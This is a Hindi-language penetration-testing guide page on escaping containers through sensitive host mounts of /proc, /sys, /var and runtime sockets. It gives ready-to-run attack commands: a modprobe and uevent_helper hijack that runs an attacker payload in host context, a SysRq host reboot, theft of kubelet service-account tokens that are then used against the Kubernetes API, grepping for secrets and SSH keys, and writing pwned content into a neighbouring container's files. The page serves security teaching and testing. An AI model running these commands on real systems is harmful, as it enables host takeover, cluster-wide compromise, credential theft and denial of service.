# संवेदनशील होस्ट माउंट्स

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

होस्ट माउंट्स कंटेनर-एस्केप के व्यावहारिक सतहों में से एक हैं क्योंकि ये अक्सर एक सावधानीपूर्वक अलग किए गए process view को फिर से होस्ट संसाधनों की प्रत्यक्ष दृश्यता में बदल देते हैं। खतरे केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var` के bind mounts, runtime sockets, kubelet-managed state, या डिवाइस-सम्बंधित पथ kernel controls, क्रेडेंशियल्स, पड़ोसी कंटेनर फाइल-फाइलसिस्टम, और रनटाइम मैनेजमेंट इंटरफेस उजागर कर सकते हैं।

यह पृष्ठ व्यक्तिगत सुरक्षा पृष्ठों से अलग मौजूद है क्योंकि दुरुपयोग का मॉडल क्रॉस-कटिंग है। एक लिखने योग्य host mount आंशिक रूप से mount namespaces, आंशिक रूप से user namespaces, आंशिक रूप से AppArmor या SELinux कवरेज, और आंशिक रूप से इसलिए खतरनाक होता है क्योंकि किस असल host path को एक्सपोज़ किया गया है। इसे एक अलग विषय मानने से attack surface को समझना आसान होता है।

## `/proc` एक्सपोज़र

procfs में सामान्य process जानकारी और उच्च-प्रभाव वाले kernel control इंटरफेस दोनों होते हैं। इसलिए `-v /proc:/host/proc` जैसे bind mount या ऐसा container view जो अनपेक्षित writable proc एंट्रीज़ को उजागर करे, जानकारी के खुलासे, denial of service, या सीधे host code execution का कारण बन सकता है।

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### दुरुपयोग

शुरुआत करें यह जाँच कर कि कौन-कौन सी उच्च-मूल्य वाली procfs एंट्रीज़ दिखाई दे रही हैं या लिखने योग्य हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
ये paths अलग‑अलग कारणों से महत्वपूर्ण हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए शक्तिशाली reconnaissance स्रोत हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context reveal करते हैं जो container के अंदर से host layout reconstruct करने में मदद कर सकते हैं।

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
  अगर writable हो, तो यह उन सबसे high-impact procfs paths में से एक है क्योंकि kernel crash के बाद एक pipe handler execute करेगा। ऐसा container जो अपने `core_pattern` को overlay में store किए गए payload या mounted host path पर point कर सके, अक्सर host code execution प्राप्त कर सकता है। एक समर्पित उदाहरण के लिए देखें भी [read-only-paths.md](protections/read-only-paths.md)।
- `/proc/sys/kernel/modprobe`
  यह path userspace helper को नियंत्रित करता है जिसे kernel module-loading logic invoke करने के लिए उपयोग करता है। अगर यह container से writable है और host context में interpret होती है, तो यह एक और host code-execution primitive बन सकती है। यह खासकर तब दिलचस्प है जब किसी तरीके के साथ combine किया जाए जो helper path को trigger करे।
- `/proc/sys/vm/panic_on_oom`
  यह आमतौर पर एक clean escape primitive नहीं है, लेकिन यह memory pressure को host-wide denial of service में बदल सकता है क्योंकि यह OOM conditions को kernel panic व्यवहार में बदल देता है।
- `/proc/sys/fs/binfmt_misc`
  अगर registration interface writable है, तो attacker चुने हुए magic value के लिए handler register कर सकता है और जब कोई matching file execute हो तो host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
  kernel exploit triage के लिए उपयोगी। यह पता लगाने में मदद करता है कि कौन से subsystems, mitigations, और optional kernel features enabled हैं, बिना host package metadata की ज़रूरत के।
- `/proc/sysrq-trigger`
  आम तौर पर यह denial-of-service path है, पर बहुत गंभीर। यह तुरंत host reboot, panic, या अन्यथा disrupt कर सकता है।
- `/proc/kmsg`
  kernel ring buffer messages reveal करता है। host fingerprinting, crash analysis के लिए उपयोगी, और कुछ environments में leaking information जो kernel exploitation में मददगार हो सकती है।
- `/proc/kallsyms`
  readable होने पर मूल्यवान है क्योंकि यह exported kernel symbol information को expose करता है और kernel exploit development के दौरान address randomization assumptions को defeat करने में मदद कर सकता है।
- `/proc/[pid]/mem`
  यह एक direct process-memory interface है। अगर target process आवश्यक ptrace-style conditions के साथ reachable है, तो यह किसी अन्य process की memory पढ़ने या modify करने की अनुमति दे सकता है। वास्तविक प्रभाव विशेष रूप से credentials, `hidepid`, Yama, और ptrace restrictions पर निर्भर करता है, इसलिए यह एक powerful लेकिन conditional path है।
- `/proc/kcore`
  system memory का core-image-style view expose करता है। यह file बहुत बड़ा और उपयोग में मुश्किल है, लेकिन अगर यह meaningful रूप से readable है तो यह एक badly exposed host memory surface का संकेत देता है।
- `/proc/kmem` and `/proc/mem`
  ऐतिहासिक रूप से high-impact raw memory interfaces रहे हैं। कई आधुनिक systems पर ये disabled या heavily restricted हैं, लेकिन अगर मौजूद और usable हैं तो इन्हें critical findings माना जाना चाहिए।
- `/proc/sched_debug`
  Leaks scheduling और task information जो host process identities को expose कर सकता है, भले ही अन्य process views अपेक्षा से cleaner दिखें।
- `/proc/[pid]/mountinfo`
  यह बेहद उपयोगी है यह reconstruct करने के लिए कि container असल में host पर कहां रहता है, कौन से paths overlay-backed हैं, और क्या कोई writable mount host content से मेल खाता है या केवल container layer तक सीमित है।

यदि `/proc/[pid]/mountinfo` या overlay details readable हैं, तो इन्हें use करके container filesystem का host path recover करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये commands उपयोगी हैं क्योंकि कई host-execution tricks के लिए container के अंदर के path को host के दृष्टिकोण से संबंधित path में बदलना आवश्यक होता है।

### पूर्ण उदाहरण: `modprobe` Helper Path Abuse

यदि `/proc/sys/kernel/modprobe` container से writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload की ओर redirect किया जा सकता है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
सटीक ट्रिगर लक्ष्य और kernel के व्यवहार पर निर्भर करता है, लेकिन महत्वपूर्ण बात यह है कि एक writable helper path भविष्य में kernel helper invocation को attacker-controlled host-path content में redirect कर सकता है।

### पूर्ण उदाहरण: Kernel Recon के साथ `kallsyms`, `kmsg`, और `config.gz`

यदि उद्देश्य तत्काल escape की बजाय exploitability assessment है:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह पता लगाने में मदद करते हैं कि उपयोगी symbol information दिखाई दे रही है या नहीं, हाल की kernel messages किसी रोचक स्थिति का खुलासा करती हैं या नहीं, और कौन-कौन सी kernel features या mitigations compiled हैं। प्रभाव आम तौर पर सीधे escape नहीं होता, लेकिन यह kernel-vulnerability triage को काफी घटा सकता है।

### पूर्ण उदाहरण: SysRq Host Reboot

यदि `/proc/sysrq-trigger` लिखने योग्य है और host view तक पहुँचता है:
```bash
echo b > /proc/sysrq-trigger
```
प्रभाव तुरंत होस्ट रिबूट है। यह कोई सूक्ष्म उदाहरण नहीं है, लेकिन यह स्पष्ट रूप से दर्शाता है कि procfs एक्सपोज़र information disclosure से कहीं अधिक गंभीर हो सकता है।

## `/sys` एक्सपोज़र

sysfs kernel और device state की बड़ी मात्रा को एक्सपोज़ करता है। कुछ sysfs paths मुख्यतः fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration, या firmware state को प्रभावित कर सकते हैं।

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths अलग-अलग कारणों से महत्वपूर्ण हैं। `/sys/class/thermal` thermal-management व्यवहार को प्रभावित कर सकता है और इसलिए खराब तरीके से एक्सपोज़्ड वातावरण में host की stability को प्रभावित कर सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout जानकारी को leak कर सकता है, जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security` वह `securityfs` इंटरफ़ेस है जिसका उपयोग Linux Security Modules करते हैं, इसलिए वहां अप्रत्याशित पहुंच MAC-related state को expose या बदल सकती है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, जिससे वे सामान्य configuration फ़ाइलों की तुलना में कहीं अधिक गंभीर होते हैं। `debugfs` under `/sys/kernel/debug` विशेष रूप से खतरनाक है क्योंकि यह जानबूझकर developer-oriented इंटरफ़ेस है और hardened production-facing kernel APIs की तुलना में बहुत कम safety अपेक्षाएँ रखता है।

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` यह बता सकता है कि AppArmor, SELinux, या कोई अन्य LSM सतह ऐसी तरह दिखाई दे रही है जो केवल होस्ट तक सीमित रहनी चाहिए थी।
- `/sys/kernel/debug` अक्सर इस समूह में सबसे परेशान करने वाला निष्कर्ष होता है। यदि `debugfs` माउंट है और पढ़ने/लिखने योग्य है, तो एक व्यापक kernel-facing सतह की उम्मीद करें, जिसका वास्तविक जोखिम सक्षम debug nodes पर निर्भर करता है।
- EFI variable exposure कम सामान्य है, लेकिन मौजूद होने पर इसका प्रभाव उच्च होता है क्योंकि यह साधारण runtime फाइलों की बजाय firmware-backed सेटिंग्स को प्रभावित करता है।
- `/sys/class/thermal` मुख्य रूप से होस्ट स्थिरता और हार्डवेयर इंटरैक्शन से संबंधित है, shell-style escape के लिए नहीं।
- `/sys/kernel/vmcoreinfo` मुख्यतः host-fingerprinting और crash-analysis का स्रोत है, जो low-level kernel state को समझने में उपयोगी है।

### Full Example: `uevent_helper`

यदि `/sys/kernel/uevent_helper` writable है, तो kernel एक attacker-controlled helper को execute कर सकता है जब कोई `uevent` trigger होता है:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
यह इसलिए काम करता है कि हेल्पर पाथ होस्ट के नज़रिए से व्याख्यायित किया जाता है। एक बार ट्रिगर होने पर, हेल्पर वर्तमान container के अंदर चलने की बजाय होस्ट संदर्भ में चलता है।

## `/var` एक्सपोज़र

होस्ट का `/var` किसी container में माउंट करना अक्सर कम आंका जाता है क्योंकि यह `/` को माउंट करने जितना नाटकीय नहीं दिखता। व्यवहार में यह रनटाइम सॉकेट्स, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, और पड़ोसी application फ़ाइलसिस्टम तक पहुँचने के लिए पर्याप्त हो सकता है। आधुनिक नोड्स पर, `/var` अक्सर वही जगह होता है जहाँ सबसे अधिक ऑपरेशनल रूप से दिलचस्प container state वास्तव में रहता है।

### Kubernetes उदाहरण

एक pod जिसमें `hostPath: /var` हो अक्सर अन्य pods के projected tokens और overlay snapshot सामग्री पढ़ सकता है:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये बताती हैं कि क्या mount केवल साधारण application डेटा उजागर करता है या उच्च-प्रभाव वाले cluster credentials। एक पठनीय service-account token तुरंत local code execution को Kubernetes API access में बदल सकता है।

यदि token मौजूद है, तो token की खोज पर रुकने के बजाय यह प्रमाणित करें कि यह क्या-क्या पहुंच सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ प्रभाव स्थानीय node एक्सेस से कहीं अधिक हो सकता है। व्यापक RBAC वाला एक token mounted `/var` को क्लस्टर-व्यापी समझौते में बदल सकता है।

### Docker और containerd उदाहरण

Docker hosts पर संबंधित डेटा अक्सर `/var/lib/docker` के अंतर्गत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths के अंतर्गत हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि माउंट किया गया `/var` किसी अन्य workload के writable snapshot कंटेंट को एक्सपोज़ करता है, तो attacker एप्लिकेशन फ़ाइलों को बदल सकता है, वेब कंटेंट प्लांट कर सकता है, या स्टार्टअप स्क्रिप्ट्स में बदलाव कर सकता है बिना वर्तमान container configuration को छुए।

जब writable snapshot कंटेंट मिल जाए तो संभावित दुरुपयोग विचार:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
ये कमांड उपयोगी हैं क्योंकि वे mounted `/var` की तीन मुख्य प्रभाव श्रेणियाँ दिखाते हैं: application tampering, secret recovery, और lateral movement into neighboring workloads।

## Runtime Sockets

Sensitive host mounts अक्सर full directories के बजाय runtime sockets होते हैं। ये इतने महत्वपूर्ण हैं कि इन्हें यहाँ स्पष्ट रूप से दोहराया जाना चाहिए:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
इन सॉकेट्स में से किसी एक के माउंट होने के बाद पूरे exploitation flows देखने के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक त्वरित प्रारंभिक इंटरैक्शन पैटर्न के रूप में:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई एक सफल हो जाता है, तो "mounted socket" से "start a more privileged sibling container" तक का रास्ता आम तौर पर किसी भी kernel breakout पथ की तुलना में बहुत छोटा होता है।

## Mount-Related CVEs

Host mounts runtime vulnerabilities के साथ भी जुड़ते हैं। हाल के महत्वपूर्ण उदाहरण शामिल हैं:

- `CVE-2024-21626` in `runc`, जहां a leaked directory file descriptor working directory को host filesystem पर रख सकता है।
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, जहां OverlayFS copy-up races builds के दौरान host-path writes पैदा कर सकते हैं।
- `CVE-2024-1753` in Buildah and Podman build flows, जहां crafted bind mounts build के दौरान `/` को read-write के रूप में उजागर कर सकते हैं।
- `CVE-2024-40635` in containerd, जहां एक बड़ा `User` value UID 0 व्यवहार में overflow कर सकता है।

ये CVEs यहां इसलिए महत्वपूर्ण हैं क्योंकि ये दिखाते हैं कि mount handling केवल operator configuration के बारे में नहीं है। runtime स्वयं भी mount-driven escape conditions ला सकता है।

## Checks

इन कमांड्स का उपयोग करके सबसे उच्च-मूल्य वाले mount exposures जल्दी ढूँढें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- होस्ट का रूट, `/proc`, `/sys`, `/var`, और रनटाइम सॉकेट्स सभी उच्च-प्राथमिकता निष्कर्ष हैं।
- लिखने योग्य proc/sys एंट्रीज़ अक्सर संकेत देती हैं कि mount होस्ट-ग्लोबल kernel नियंत्रणों को एक्सपोज़ कर रहा है, न कि एक सुरक्षित container view।
- माउंट किए गए `/var` पाथ्स के लिए सिर्फ filesystem समीक्षा पर्याप्त नहीं है — क्रेडेंशियल और पड़ोसी-वर्कलोड की समीक्षा भी आवश्यक है।
